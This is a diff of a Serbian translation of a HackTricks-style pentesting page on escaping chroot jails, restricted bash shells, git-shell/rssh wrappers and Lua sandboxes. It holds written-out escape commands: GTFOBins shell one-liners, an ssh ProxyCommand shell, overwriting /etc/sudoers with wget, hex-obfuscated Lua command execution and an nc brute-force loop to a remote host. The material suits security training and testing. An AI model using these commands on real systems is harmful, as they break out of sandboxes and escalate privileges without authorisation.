@@ -4,24 +4,24 @@
 
 ## **GTFOBins**
 
-**Pretražite** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da biste proverili da li možete izvršiti bilo koji binary sa svojstvom "Shell"**
+**Pretražite** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da proverite da li možete da izvršite bilo koji binary sa svojstvom „Shell“**
 
-## Chroot escapes
+## Izlasci iz chroot-a
 
-Sa [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): chroot mehanizam **nije namenjen zaštiti** od namernog manipulisanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne nasleđuju pravilno, a chrootovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot da bi izašli**.\
+Prema [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mehanizam chroot nije **namenjen odbrani** od namernog menjanja od strane **privileged** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne mogu pravilno ulančavati, a chrootovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot kako bi izašli**.\
 To obično znači da za izlazak morate biti root unutar chroot-a.
 
 > [!TIP]
-> **Alat** [**chw00t**](https://github.com/earthquake/chw00t) kreiran je za zloupotrebu sledećih scenarija i izlazak iz `chroot`.
+> **Alat** [**chw00t**](https://github.com/earthquake/chw00t) napravljen je za zloupotrebu sledećih scenarija i izlazak iz `chroot`-a.<sup>[[1]](#references)</sup>
 
 ### Root + CWD
 
 > [!WARNING]
-> Ako ste **root** unutar chroot-a, **možete izaći** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu koegzistirati (u Linux-u), pa ako kreirate folder i zatim **kreirate novi chroot** u tom novom folderu dok ste **izvan njega**, sada ćete biti **izvan novog chroot-a** i samim tim ćete se nalaziti u FS-u.
+> Ako ste **root** unutar chroot-a, **možete izaći** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu da postoje istovremeno (u Linux-u), pa ako kreirate folder, a zatim **kreirate novi chroot** u tom novom folderu dok se **vi nalazite izvan njega**, sada ćete biti **izvan novog chroot-a** i samim tim ćete se nalaziti u FS-u.
 >
-> Ovo se dešava zato što chroot obično NE menja vaš radni direktorijum u navedeni direktorijum, pa možete kreirati chroot, a da se ne nalazite u njemu.
+> To se dešava zato što chroot obično NE premešta vaš radni direktorijum na navedeni direktorijum, pa možete kreirati chroot, a da se nalazite izvan njega.
 
-Obično nećete pronaći `chroot` binary unutar chroot jail-a, ali možete **kompajlirati, upload-ovati i izvršiti** binary:
+Obično nećete pronaći `chroot` binary unutar chroot jail-a, ali biste mogli da kompajlirate, otpremite i izvršite binary:
 
 <details>
 
@@ -79,7 +79,7 @@ system("/bin/bash");
 ### Root + Saved fd
 
 > [!WARNING]
-> Ovo je slično prethodnom slučaju, ali u ovom slučaju **attacker čuva file descriptor trenutnog direktorijuma**, a zatim **kreira chroot u novom folderu**. Na kraju, pošto ima **access** tom **FD-u** **izvan** chroot-a, pristupa mu i **escapes**.
+> Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva file descriptor trenutnog direktorijuma**, a zatim **kreira chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD-u** **izvan** chroot-a, pristupa mu i **izlazi**.
 
 <details>
 
@@ -109,21 +109,21 @@ chroot(".");
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 > [!WARNING]
-> FD može da se prosledi preko Unix Domain Sockets, zato:
+> FD se može proslediti preko Unix Domain Sockets, zato:
 >
-> - Kreirajte child proces (fork)
+> - Kreirajte child process (fork)
 > - Kreirajte UDS kako bi parent i child mogli da komuniciraju
-> - Pokrenite chroot u child procesu, u drugom direktorijumu
-> - U parent proc kreirajte FD direktorijuma koji se nalazi izvan novog chroot-a child proc-a
-> - Prosledite taj FD child proc-u pomoću UDS-a
-> - Child proces izvršava chdir ka tom FD-u i, pošto se nalazi izvan svog chroot-a, izaći će iz jail-a
+> - Pokrenite chroot u child process-u, u drugom folderu
+> - U parent process-u kreirajte FD foldera koji se nalazi izvan novog chroot-a child process-a
+> - Prosledite taj FD child process-u koristeći UDS
+> - Child process izvršava chdir ka tom FD-u i, pošto se on nalazi izvan njegovog chroot-a, napušta jail
 
 ### Root + Mount
 
 > [!WARNING]
 >
-> - Mount-ujte root device (/) u direktorijum unutar chroot-a
-> - Izvršite chroot u taj direktorijum
+> - Mount-ovanje root uređaja (/) u folder unutar chroot-a
+> - Izvršavanje chroot-a u tom folderu
 >
 > Ovo je moguće u Linux-u
 
@@ -131,30 +131,30 @@ chroot(".");
 
 > [!WARNING]
 >
-> - Mount-ujte procfs u direktorijum unutar chroot-a (ako već nije)
-> - Pronađite pid koji ima drugačiji root/cwd entry, kao što je: /proc/1/root
+> - Mount-ujte procfs u folder unutar chroot-a (ako već nije mount-ovan)
+> - Potražite pid koji ima drugačiji root/cwd entry, na primer: /proc/1/root
 > - Izvršite chroot u taj entry
 
 ### Root(?) + Fork
 
 > [!WARNING]
 >
-> - Kreirajte Fork (child proc) i izvršite chroot u drugi direktorijum dublje u FS-u, a zatim uradite CD u njega
-> - Iz parent procesa premestite direktorijum u kojem se child proces nalazi u direktorijum pre chroot-a child procesa
-> - Ovaj child proces će se naći izvan chroot-a
+> - Kreirajte Fork (child proc) i izvršite chroot u drugi folder dublje u FS-u, a zatim izvršite CD u njega
+> - Iz parent process-a premestite folder u kojem se child process nalazi u folder koji je prethodio chroot-u child process-a
+> - Ovaj child process će se naći izvan chroot-a
 
 ### ptrace
 
 > [!WARNING]
 >
-> - Ranije su korisnici mogli da debug-uju sopstvene procese iz procesa koji im pripadaju... ali to više nije podrazumevano moguće
+> - Ranije su korisnici mogli da debug-uju sopstvene procese iz sopstvenog procesa... ali to više nije podrazumevano moguće
 > - U svakom slučaju, ako je to moguće, mogli biste da koristite ptrace nad procesom i izvršite shellcode unutar njega ([pogledajte ovaj primer](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).
 
 ## Bash Jails
 
-### Enumeracija
+### Enumeration
 
-Prikupite informacije o jail-u:
+Pribavite informacije o jail-u:
 ```bash
 echo $0
 echo $SHELL
@@ -169,7 +169,7 @@ type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2
 ```
 ### Izmena PATH-a
 
-Proverite da li možete da izmenite PATH env varijablu
+Proverite da li možete da izmenite PATH env varijablu<sup>[[2]](#references)</sup>.
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
@@ -180,9 +180,9 @@ echo /home/* #List directory
 :set shell=/bin/sh
 :shell
 ```
-### Pageri i help viewer-i
+### Pagers and help viewers
 
-Mnoga ograničena okruženja i dalje ostavljaju **pagere** ili **help viewere** dostupnim. Njih je obično brže zloupotrebiti nego pokušavati ponovo izgraditi `PATH`.
+Mnoga ograničena okruženja i dalje imaju dostupne **pagers** ili **help viewers**. Njih je obično brže zloupotrebiti nego pokušavati ponovo izgraditi `PATH`.
 ```bash
 less /etc/hosts
 !/bin/sh
@@ -198,9 +198,9 @@ PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
 # Or: git help config
 # Then inside the pager: !/bin/sh
 ```
-### Уобичајени GTFOBins one-liners
+### Uobičajene GTFOBins jednolinijske komande
 
-Када утврдите до којих бинарних датотека можете да приступите, прво тестирајте очигледне shell spawners:
+Kada utvrdite kojim binarnim datotekama možete pristupiti, prvo testirajte očigledne načine za pokretanje shell-a:
 ```bash
 awk 'BEGIN {system("/bin/sh")}'
 find . -exec /bin/sh \; -quit
@@ -209,7 +209,7 @@ zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
 script /dev/null -c bash
 ssh localhost /bin/sh
 ```
-Ako možete samo da **ubrizgate argumente** u dozvoljenu komandu (umesto da je slobodno pokrenete), proverite i **GTFOArgs**.
+Ako možete samo da **ubacujete argumente** u dozvoljenu komandu (umesto da je slobodno pokrećete), proverite i **GTFOArgs**.
 
 ### Kreiranje skripte
 
@@ -218,7 +218,7 @@ Proverite da li možete da kreirate izvršnu datoteku čiji je sadržaj _/bin/ba
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### Nabavite bash putem SSH-a
+### Dobijanje bash-a putem SSH-a
 
 Ako pristupate putem ssh-a, često možete zatražiti od servera da izvrši **drugi program** umesto ograničene login shell:
 ```bash
@@ -227,13 +227,13 @@ ssh user@<IP> -t "/bin/sh"
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-Ako je `ssh` jedan od malobrojnih lokalno dozvoljenih binarnih fajlova, imajte na umu da se može zloupotrebiti i kao **GTFOBin**:
+Ako je `ssh` jedan od nekoliko lokalno dozvoljenih binarnih fajlova, imajte na umu da se može zloupotrebiti i kao **GTFOBin**:
 ```bash
 ssh localhost /bin/sh
 ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
 ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
 ```
-### Deklariši
+### Declare
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
@@ -241,19 +241,19 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 ### Wget
 
-Možete prepisati, na primer, sudoers fajl
+Možete, na primer, prepisati sudoers fajl
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)
+### Ograničeni shell wrapper-i (`git-shell`, `rssh`, `lshell`)
 
-Neka okruženja vas ne uvode u običan `rbash`, već u **wrappers** kao što su `git-shell`, `rssh` ili `lshell`:
+Neka okruženja vas ne uvode u običan `rbash`, već u **wrapper-e** kao što su `git-shell`, `rssh` ili `lshell`:
 
-- `git-shell` prihvata samo Git komande na serverskoj strani, kao i sve što se nalazi unutar `~/git-shell-commands/`. Ako taj direktorijum postoji, pokrenite `help` da biste izlistali dozvoljene prilagođene radnje. Ako možete da **upisujete** u njega, svaki izvršni fajl koji ubacite u taj direktorijum postaje dostupan.
-- `rssh` / `lshell` obično dozvoljavaju samo `scp`, `sftp`, `rsync` ili operacije u Git stilu. U tim slučajevima se prvo fokusirajte na **primitive za upisivanje fajlova**: otpremite `authorized_keys`, shell startup fajl ili pomoćnu skriptu na lokaciju u koju može da se upisuje, a zatim se ponovo povežite pomoću `ssh -t ...`.
+- `git-shell` prihvata samo Git komande na serverskoj strani, kao i sve što se nalazi unutar `~/git-shell-commands/`. Ako taj direktorijum postoji, pokrenite `help` da biste izlistali dozvoljene prilagođene akcije. Ako možete da **pišete** u njega, bilo koji izvršni fajl ubačen u taj direktorijum postaje dostupan.<sup>[[3]](#references)</sup>
+- `rssh` / `lshell` obično dozvoljavaju samo `scp`, `sftp`, `rsync` ili operacije u Git stilu. U tim slučajevima se prvo fokusirajte na **primitives za upis fajlova**: otpremite `authorized_keys`, shell startup fajl ili pomoćnu skriptu na lokaciju u koju možete da pišete, a zatim se ponovo povežite pomoću `ssh -t ...`.
 - Ako wrapper samo filtrira komandnu liniju, izlistajte dostupne binarne fajlove, a zatim pređite na **GTFOBins / GTFOArgs**.
 
-### Ostali trikovi
+### Druge tehnike
 
 Takođe proverite:
 
@@ -279,22 +279,22 @@ Trikove za escaping iz Python jail-ova možete pronaći na sledećoj stranici:
 
 ## Lua Jails
 
-Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
+Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar Lua-e: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
 
 **Eval sa izvršavanjem komandi:**
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-Nekoliko trikova za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
+Neki trikovi za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-Nabrojte funkcije biblioteke:
+Izlistavanje funkcija biblioteke:
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-Imajte na umu da se svaki put kada izvršite prethodni one liner u **drugačijem Lua okruženju redosled funkcija menja**. Zato, ako treba da izvršite određenu funkciju, možete izvršiti brute force attack tako što ćete učitati različita Lua okruženja i pozvati prvu funkciju le biblioteke:
+Imajte na umu da se svaki put kada izvršite prethodni **one-liner** u **drugačijem lua okruženju, redosled funkcija menja**. Zato, ako treba da izvršite određenu funkciju, možete izvršiti brute force napad učitavanjem različitih lua okruženja i pozivanjem prve funkcije biblioteke:
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -305,14 +305,14 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**Dobijanje interaktivnog lua shell-a**: Ako se nalazite unutar ograničenog lua shell-a, možete dobiti novi lua shell (i nadamo se neograničen) pozivanjem:
+**Dobijanje interaktivnog lua shell-a**: Ako se nalazite unutar ograničenog lua shell-a, možete dobiti novi lua shell (i nadati se da je bez ograničenja) pozivanjem:
 ```bash
 debug.debug()
 ```
 ## Reference
 
-- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdovi: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
-- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
-- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)
+- [1] [Chw00t: Kako izaći iz različitih chroot rešenja (Bucsay Balazs, DeepSec predavanje i slajdovi)](https://www.youtube.com/watch?v=UO618TeyCWo)
+- [2] [GNU Bash referentno uputstvo – The Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
+- [3] [git-shell – Git dokumentacija](https://git-scm.com/docs/git-shell)
 
 {{#include ../../banners/hacktricks-training.md}}
